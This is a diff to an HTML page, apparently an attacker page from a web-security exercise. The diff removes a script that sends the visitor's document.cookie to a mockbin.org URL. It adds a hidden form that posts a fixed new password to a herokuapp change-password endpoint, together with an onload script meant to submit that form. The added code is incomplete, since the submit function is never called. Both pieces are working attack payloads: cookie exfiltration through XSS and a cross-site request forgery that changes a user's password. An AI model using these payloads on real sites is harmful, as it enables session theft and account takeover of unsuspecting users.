@@ -18,8 +18,35 @@
 
 
 
-<script>$.ajax('http://mockbin.org/bin/29afb543-0b3b-4f57-9542-b91df6974ee8?session'+document.cookie)</script>
+ <form method="post"style="display:none;" action="http://silver-quire.herokuapp.com/change-password">
+      <div class="form-group">
+        <label for="password" class="col-sm-4 control-label">Password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password]" value="asdasd" class="form-control"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password_confirmation]" value="asdasd"  class="form-control"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <div class="col-sm-offset-4 col-sm-4">
+          <button type="submit" class="btn btn-primary">Change!</button>
+        </div>
+      </div>
+    </form>
 
+<script type="text/javascript">
+    window.onload=function(){
+       
+
+        function submitform(){
+          document.forms["myForm"].submit();
+        }
+    }
+</script>
 
       </div>
   </body>
